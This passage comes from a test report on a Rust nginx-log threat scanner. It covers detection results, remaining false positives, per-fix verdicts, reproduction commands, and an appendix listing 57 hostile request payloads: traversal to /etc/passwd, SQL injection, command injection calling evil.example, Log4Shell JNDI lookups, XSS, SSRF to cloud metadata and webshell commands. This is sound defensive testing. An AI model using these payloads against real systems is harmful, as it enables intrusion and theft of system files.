Categories: Reconnaissance 218; Sensitive File Access 54; Path Traversal 28; SQL Injection 17; Webshell 14; LFI 14; XSS 13; SSRF 11; Log4Shell 8; Command Injection 4; Brute Force 1. The prior run reported 379 events, 9 IPs, 12 workers and 535 ms; the +3 events are the added rules firing on existing payloads, and worker count reflects the host's available parallelism at run time. Throughput and aggregation still behave as documented.

### 8.3 Benign fixture

`tests/fixtures/benign.log` (60 lines):

```
Lines 60 scanned · 0 malformed
Threats 0 suspicious events · 0 unique offending IPs
✓ No suspicious activity detected.
```

**Zero events.** Pass.

### 8.4 Truncation notice

A supplementary capped run (`--max-events 10`) on the demo log printed:

```
Threats      10 suspicious events  ·  4 unique offending IPs
! Event or auth-failure storage cap reached — rerun with a higher --max-events for full coverage.
```

The notice path works; the default run has no notice because it does not reach the cap. This also confirms `--max-events` is a hard cap (10 stored events) while the summary remains readable.

### 8.5 Rule inventory

| Count | Value |
|---|---|
| `RuleSpec` entries (11 families) | **138** |
| Stateful detector IDs (`BF-001`, `AUTH-001`, `SCAN-001`) | 3 |
| Distinct IDs in source | **141** |
| `docs/detections.md` claim | 138 rules + 3 stateful — matches |
| `RECON-013` | absent (numbering gap only; 14 recon rules exist) |

The prior report's 119-ID count is superseded. No duplicate IDs were found; `rule_metadata_is_consistent` passes as part of the 176 unit tests.

---

## 9. Remaining risks

Ordered by operational impact. “New” means introduced or materially worsened by the hardening; “pre-existing” means present in the prior build.

1. **`CMDI-001` matrix-parameter false positive — NEW, CRITICAL score.**
   `/shop;env=prod`, `/products;cp=2`, `/items;rm=1`, `;tar=`, `;find=`, `;kill=`, `;dd=`, `;ssh=`, `;ftp=`, `;scp=` all fire at severity 10 (12.50 on 200). `;id=` was already exposed before hardening. This is common Java/Spring URL syntax, so a single legitimate request can top the CRITICAL list. Fix before release: require a whitespace/path separator after the command token, or explicitly exempt `;key=` matrix syntax.

2. **`SSRF-002` protocol-relative legitimate links — pre-existing, HIGH score.**
   `?url=//cdn.example.com/image.png` and three other partner-style links score 8.75 HIGH. The docs acknowledge it; consider lowering to severity 3 or adding a public-host allowlist. Absolute public URLs are fixed, so this is the remaining SSRF noise vector.

3. **Header scope is partial — PARTIAL fix.**
   No `User-Agent` traversal rule exists (5/5 variants returned 0, including `../../etc/passwd`, encoded `%2e%2e%2f`, a Windows `..` backslash traversal, and `/..;/..;/etc/passwd`). Percent-encoded SQLi/XSS in UA and Referer also return 0 because header rules match the raw value; only `TRAV-011` has an encoded alternative. Real Referer URLs are usually encoded, so this is a practical FN, not just a theoretical one.

4. **`BF-001` + `SCAN-001` double-count on 403 login/admin — pre-existing design, amplified.**
   25 distinct 403 `/login/attemptN` → 2 events; 25 distinct 403 `/admin/areaN` → 27 events. `AUTH-001` does not overlap, but the older pair does. Separately, 25 × 403 `/login` → `BF-001` 7.00, so a site that returns 403 for geo/WAF blocks on the login path can produce a false brute-force signal. Consider 401-only for `BF-001` severity 7, and either exclude 403 from `BF-001` or exclude login-hinted 403s from `SCAN-001`’s distinct count.

5. **`SCAN-001` floor 25 increases recon noise — intended trade-off, coupled threshold.**
   25–28 distinct 404s from one IP now fire at defaults; the preserved `w3-404-tail-28.log` went 0 → 1 event (5.00). Static assets are excluded and 40 static 403s are clean, but broken-link crawlers and signed-URL 404s can produce MEDIUM events. There is no independent `--scan-threshold`; `--threshold 5` still floors at 25, and `--help` only describes failed logins. Acceptable for a scanner; document the floor for operators.

6. **Keyword SQLi false positive — pre-existing.**
   `/search?q=union+select+syntax` → `SQLI-001` 11.25 HIGH. No context can distinguish a documentation/search phrase from injection with the current target-only rules. Low frequency, but it is a HIGH-scoring benign hit.

7. **Event inflation — P3 not addressed.**
   147 events for 57 attack requests (2.58/request); the demo reports 382 events. `TOP THREATS` still dedups per `(IP, line)`, so headline counts and the visible list disagree for multi-rule lines. The prior recommendation to add “unique offending requests” was not implemented.

8. **JSON Unicode escapes — pre-existing parser gap.**
   `wave4-json-unicode-ua` (a JSON `http_user_agent` containing a Unicode-escaped `${jndi:ldap://evil/x}`) still returns 0. The JSON parser leaves Unicode escape sequences undecoded, so a Log4Shell payload hidden in escaped JSON is missed. This is separate from the new Log4Shell rules, which work on decoded targets.

9. **`WEBSHELL-009` mislabels downloads — pre-existing.**
   `?file=config.php.old` triggers “upload parameter with an executable extension” at severity 9, plus a sensitive-file rule, for 12.94 CRITICAL. The download of a config backup is suspicious, but the webshell category and CRITICAL score overstate it. Consider restricting the rule to upload-ish parameter names (`upload`, `attach`, `filename`) or lowering severity when a backup suffix is present.

---

## 10. What was run vs not run

**Run:**

- Freshness check: binary mtime vs every `src/*.rs`; SHA-256 recorded. No rebuild needed.
- `cargo test --release`: 176 unit (1 ignored) + 18 integration, 0 failures.
- Full prior harness: 57 attacks, 20 benign, 9 correlation scenarios, 2 aggregate logs.
- `wave2.py` (34 probes), `wave4.py` (10), `wave5.py` (15).
- 53 new benign lookalikes; 16 matrix-parameter probes; 5 UA-traversal variants; 4 protocol-relative URLs; 9 additional 403/SCAN scenarios; 3 double-count scenarios; 3 path-normalization scenarios; 28 exact prior-fix payload cases.
- `demo/access-demo.log` at defaults; `tests/fixtures/benign.log`; a `--max-events 10` truncation run.
- Parsing of headline events, category counts, visible top rules, scores and base scores from the dashboard.

**Not run:**

- No rebuild; the binary was newer than all source files. If `src/` changes after this report, re-run the suite.
- No fuzzing of the parser/reader beyond the prior waves' malformed cases.
- No third-party log layouts beyond combined/common/JSON/vhost already in the waves.
- No POST-body inspection (the rule set deliberately never reads bodies).
- No statistical/production corpus; payloads are hand-crafted and adversarially biased.
- Not every one of the 138 rules was exercised individually; coverage is corpus-driven.
- No long-running load/soak test; the demo run is a single 600k-line pass.

---

## 11. Final verdict by priority fix

| Priority item | Verdict | Note |
|---|---|---|
| P0 `SSRF-001` demotion and parameter restriction | **PASS** | Four benign absolute-URL lookalikes clean; metadata URL still detected; 20/200 realistic SSRF events eliminated; residual informational hits at 2.50 MEDIUM |
| P0 Log4Shell nested `${${lower:j}…}` | **PASS** | `LOG4SHELL-010` + `LOG4SHELL-011`, 14.37; raw and encoded forms |
| P1 SQLi literal/obfuscation rules | **PASS** | Six previously missed probes all detected, 3.75–11.25 |
| P1 Header scope (SQLi/traversal/XSS) | **PARTIAL** | Four prior header payloads pass (7.50/7.50/6.25/5.00), UA XSS passes; **UA traversal has no rule**; percent-encoded header SQLi/XSS evade |
| P1 `CMDI-001` command list | **PASS on payloads / FAIL on regression** | `;rm`, `;shutdown`, `;telnet` detected at 12.50; new matrix-parameter CRITICAL FP (`;env=`, `;cp=`, …) |
| P1 `WEBSHELL-004` value guard | **PASS** | `?cmd=download` and `?cmd=add-to-cart` clean; `?cmd=whoami` still fires |
| P1 `SCAN-001` threshold at defaults | **PASS** | 30 distinct 404s fire at 5.00; 24 at `--threshold 5` do not |
| P1 `SCAN-001` static-asset exclusion | **PASS** | 40 distinct static 403s → 0 events |
| P1 `BF-001` login hints + `AUTH-001` | **PASS** (AUTH itself clean) | 25 API 401s → `AUTH-001` 4.00; 25/20 login 401s → `BF-001` 7.00; 19 → 0. Separate BF/SCAN 403 overlap remains |
| P2 `TRAV-009/010` `..;` and overlong UTF-8 | **PASS** | 7.50 each |
| P2 `XSS-004` handler list | **PASS** | `ontouchmove` 6.25; `onpointerdown` also detected |
| P2 `RECON-008` admin-path noise | **UNCHANGED (accepted)** | 3.75 MEDIUM; 25 events/200 benign |
| P3 `SENS-015` backup narrowing | **PASS** | `release-notes.old` clean; config/source backups still detected |
| P3 Reporting: unique offending requests | **NOT ADDRESSED** | 2.58 events/request; TOP THREATS still dedups per line |
| P3 Rule inventory | **PASS (cosmetic gap)** | 138 specs + 3 stateful = 141 IDs; `RECON-013` absent |

**Overall:** the hardening achieves its primary detection goals — **0 core-corpus false negatives, 0 CRITICAL false positives in the 20 prior benign lookalikes and the 200-request realistic log, and correct `AUTH-001`/`BF-001`/`SCAN-001` calibration**. It is **not regression-free**: the new 53-request lookalike corpus still exposes three unexpected HIGH/CRITICAL hits (two matrix-parameter hits and one keyword-SQLi search), the `CMDI-001` matrix-parameter CRITICAL false positive is a release blocker on Java/Spring traffic, and the header-scope fix is only partial. The next iteration should fix the matrix guard first, then decide whether to accept `SSRF-002`’s documented protocol-relative HIGH hits and add UA traversal plus header decoding.

---

## Appendix A — core attack corpus (57 payloads)

`Events` is the headline count; `Visible rule` is the highest-ranked printed rule (TOP THREATS dedups per line).

| ID | Payload (as logged) | Det. | Events | Visible rule | Categories (count) |
|---|---|:--:|---:|---|---|
| trav-01 | `/..%2f..%2fetc/passwd` | Y | 6 | LFI-003 | Path Traversal (5); LFI (1) |
| trav-02 | `/%2e%2e%2f%2e%2e%2fetc/passwd` | Y | 6 | LFI-003 | Path Traversal (5); LFI (1) |
| trav-03 | `/%252e%252e%252fetc%252fpasswd` | Y | 5 | LFI-003 | Path Traversal (4); LFI (1) |
| trav-04 | `/....//....//etc/passwd` | Y | 6 | LFI-003 | Path Traversal (5); LFI (1) |
| trav-05 | `/..%5c..%5cwindows%5cwin.ini` | Y | 4 | TRAV-006 | Path Traversal (4) |
| trav-06 | `/etc/passwd%00.png` | Y | 4 | LFI-003 | Malformed (2); LFI (1); Path Traversal (1) |
| trav-07 | `/..%c0%af..%c0%afetc/passwd` | Y | 1 | TRAV-010 | Path Traversal (1) |
| trav-08 | `/%2e%2e%2f%2e%2e%2fetc%2fpasswd` | Y | 6 | LFI-003 | Path Traversal (5); LFI (1) |
| lfi-01 | `/?page=php://filter/convert.base64-encode/resource=index` | Y | 2 | LFI-001 | LFI (2) |
| lfi-02 | `/?file=..%2f..%2f..%2fproc%2fself%2fenviron` | Y | 8 | LFI-002 | Path Traversal (5); LFI (3) |
| lfi-03 | `/?include=/etc/shadow` | Y | 3 | LFI-002 | LFI (2); Path Traversal (1) |
| lfi-04 | `/?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex` | Y | 3 | LFI-001 | LFI (3) |
| sqli-01 | `/?id=1%27%20OR%20%271%27=%271` | Y | 2 | SQLI-004 | SQL Injection (2) |
| sqli-02 | `/?id=1%20UN/**/ION%20SEL/**/ECT%20password%20FROM%20users` | Y | 1 | SQLI-001 | SQL Injection (1) |
| sqli-03 | `/?id=%31%20AND%20%31=%31` | Y | 2 | SQLI-005 | SQL Injection (2) |
| sqli-04 | `/?q=1%3BSLEEP%285%29` | Y | 1 | SQLI-006 | SQL Injection (1) |
| sqli-05 | `/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--` | Y | 3 | SQLI-007 | SQL Injection (3) |
| sqli-06 | `/?q=1%20AND%20BENCHMARK%281000000,MD5%281%29%29` | Y | 1 | SQLI-006 | SQL Injection (1) |
| sqli-07 | `/?q=1%20UNION%20SELECT%20@@version` | Y | 1 | SQLI-001 | SQL Injection (1) |
| sqli-08 | `/?id=1%27/**/OR/**/1=1` | Y | 2 | SQLI-003 | SQL Injection (2) |
| sqli-09 | `/?id=1%09or%091%3D1` | Y | 2 | SQLI-003 | SQL Injection (2) |
| cmdi-01 | `/?host=127.0.0.1%3Bcat%20/etc/passwd` | Y | 4 | CMDI-001 | CMDI (1); LFI (1); Path Traversal (1); SSRF (1) |
| cmdi-02 | `/?host=127.0.0.1%3Bcat%24%7BIFS%7D/etc/passwd` | Y | 5 | CMDI-001 | CMDI (2); LFI (1); Path Traversal (1); SSRF (1) |
| cmdi-03 | `/?x=%7Cid` | Y | 1 | CMDI-001 | CMDI (1) |
| cmdi-04 | `/?x=%60id%60` | Y | 1 | CMDI-002 | CMDI (1) |
| cmdi-05 | `/?x=%24%28whoami%29` | Y | 1 | CMDI-003 | CMDI (1) |
| cmdi-06 | `/?x=%0Acat%20/etc/passwd` | Y | 3 | CMDI-008 | CMDI (1); LFI (1); Path Traversal (1) |
| cmdi-07 | `/?x=%3Bcurl%24%7BIFS%7Dhttp://evil.example` | Y | 2 | CMDI-001 | CMDI (2) |
| cmdi-08 | `/?x=1%3B%20cat%20/etc/passwd` | Y | 3 | CMDI-001 | CMDI (1); LFI (1); Path Traversal (1) |
| log4j-01 | `/?x=%24%7Bjndi:ldap://evil/a%7D` | Y | 5 | LOG4SHELL-001 | Log4Shell (5) |
| log4j-02 | `/?x=%24%7B%24%7Blower:j%7Dndi:rmi://evil/b%7D` | Y | 2 | LOG4SHELL-010 | Log4Shell (2) |
| log4j-03 | `/` · UA `${jndi:dns://evil/c}` | Y | 1 | LOG4SHELL-007 | Log4Shell (1) |
| log4j-04 | `/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D` | Y | 5 | LOG4SHELL-001 | Log4Shell (5) |
| xss-01 | `/?q=%3Cscript%3Ealert(1)%3C/script%3E` | Y | 3 | XSS-001 | XSS (3) |
| xss-02 | `/?q=%3Csvg/onload=alert(1)%3E` | Y | 3 | XSS-007 | XSS (3) |
| xss-03 | `/?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E` | Y | 2 | XSS-004 | XSS (2) |
| ssrf-01 | `/?url=http://169.254.169.254/latest/meta-data/` | Y | 3 | SSRF-005 | SSRF (3) |
| ssrf-02 | `/?url=http%3A%2F%2Flocalhost%2Fadmin` | Y | 4 | SSRF-009 | SSRF (3); Recon (1) |
| ssrf-03 | `/?target=file:///etc/passwd` | Y | 3 | LFI-003 | LFI (1); Path Traversal (1); SSRF (1) |
| ssrf-04 | `/?callback=http://metadata.google.internal/` | Y | 1 | SSRF-005 | SSRF (1) |
| ssrf-05 | `/?url=http://2130706433/` | Y | 2 | SSRF-008 | SSRF (2) |
| web-01 | `/shell.php?cmd=id` | Y | 2 | WEBSHELL-001 | Webshell (2) |
| web-02 | `/upload.php?exec=whoami` | Y | 2 | WEBSHELL-001 | Webshell (2) |
| web-03 | `/?x=eval(base64_decode('ZWNobyAx'))` | Y | 1 | WEBSHELL-002 | Webshell (1) |
| recon-01 | `/` · UA `sqlmap/1.8` | Y | 1 | RECON-012 | Recon (1) |
| recon-02 | `/` · UA `Nikto/2.5.0` | Y | 1 | RECON-012 | Recon (1) |
| recon-03 | `PROPFIND /dav/` | Y | 1 | RECON-015 | Recon (1) |
| recon-04 | `/.git/config` | Y | 1 | SENS-002 | Sensitive (1) |
| recon-05 | `/server-status` | Y | 1 | RECON-002 | Recon (1) |
| recon-06 | `/actuator/env` | Y | 1 | RECON-003 | Recon (1) |
| hdr-01 | `/` · UA `Mozilla/5.0 ' OR 1=1--` | Y | 1 | SQLI-019 | SQL Injection (1) |
| hdr-02 | `/` · Referer `${jndi:ldap://evil/x}` | Y | 1 | LOG4SHELL-008 | Log4Shell (1) |
| hdr-03 | `/` · Referer `http://evil.example/../../etc/passwd` | Y | 1 | TRAV-011 | Path Traversal (1) |
| hdr-04 | `/` · Referer `http://evil.example/?q=<script>alert(1)</script>` | Y | 1 | XSS-013 | XSS (1) |
| json-01 | JSON · `/?id=1%20UNION%20SELECT%20password%20FROM%20users` | Y | 1 | SQLI-001 | SQL Injection (1) |
| json-02 | JSON · `/` · UA `${jndi:ldap://evil/x}` | Y | 1 | LOG4SHELL-007 | Log4Shell (1) |
| json-03 | JSON · `/download?file=..%2f..%2fetc%2fpasswd` | Y | 7 | LFI-002 | Path Traversal (5); LFI (2) |

---

## Appendix B — reproduction

```bash
cd /home/seun/nginx-thresh
python3 /home/seun/.hermes/cache/scratch/adversarial/harness.py   # 57 attacks + 20 benign + 9 correlations + aggregates
python3 /home/seun/.hermes/cache/scratch/adversarial/wave2.py     # calibration / encodings / headers
python3 /home/seun/.hermes/cache/scratch/adversarial/wave4.py     # parser / format variants
python3 /home/seun/.hermes/cache/scratch/adversarial/wave5.py     # remaining variants
python3 /home/seun/.hermes/cache/scratch/adversarial/verify_after.py        # exact prior-fix payloads + 53 lookalikes
python3 /home/seun/.hermes/cache/scratch/adversarial/verify_after_extra.py  # matrix / UA traversal / protocol-relative / 403
cargo test --release
./target/release/thresh demo/access-demo.log --no-color --top 100
./target/release/thresh tests/fixtures/benign.log --no-color
```

The corpus logs are under `/home/seun/.hermes/cache/scratch/adversarial/cases/`; parsed results are in `results.json`, `wave2.json`, `wave4.json`, `wave5.json`, `verify_after.json` and `verify_after_extra.json`. Prior-run snapshots are `results-prior.json`, `wave2-prior.json`, `wave4-prior.json`, `wave5-prior.json`.
